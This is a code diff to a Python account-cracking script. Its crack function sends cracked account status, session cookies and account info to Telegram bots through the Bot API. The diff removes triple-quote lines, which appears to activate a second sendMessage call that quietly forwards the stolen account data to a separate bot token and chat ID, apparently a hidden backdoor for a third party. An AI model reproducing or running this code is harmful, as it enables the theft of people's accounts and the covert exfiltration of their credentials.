@@ -1402,7 +1402,7 @@ def crack(idf,pwv):
  {kuki}
 '''
 					touy8=(f'━━━━━━━━━━•❅•°•❈•°•❅•━━━━━━━━━\n𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  •❅•°••°  6212016544\nID tg://openmessage?user_id={ID}')
- '''					
+				
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
 					requests.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
@@ -1479,7 +1479,7 @@ def crack(idf,pwv):
  {kuki}
 '''
 					touy8=(f'━━━━━━━━━━•❅•°•❈•°•❅•━━━━━━━━━\n𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  •❅•°••°  6212016544\nID tg://openmessage?user_id={ID}')
- '''					
+ 				
 					requests.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
 					
 					requests.get(f"https://api.telegram.org/bot"+str(soznop)+"/sendMessage?chat_id="+str(priut)+"&text="+str(infoakun+touy8))
